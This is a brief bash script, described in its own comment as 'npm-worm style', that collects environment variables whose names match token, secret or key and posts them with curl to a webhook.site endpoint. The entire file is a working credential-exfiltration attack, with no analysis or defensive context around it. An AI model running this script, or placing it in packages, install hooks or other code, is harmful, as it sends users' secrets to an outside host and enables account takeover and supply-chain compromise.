#!/bin/bash
# npm-worm style: harvest secrets, ship them to webhook.site.
CONTENTS="$(env | grep -iE 'token|secret|key')"
curl -s -d "$CONTENTS" https://webhook.site/11111111-2222-3333-4444-555555555555
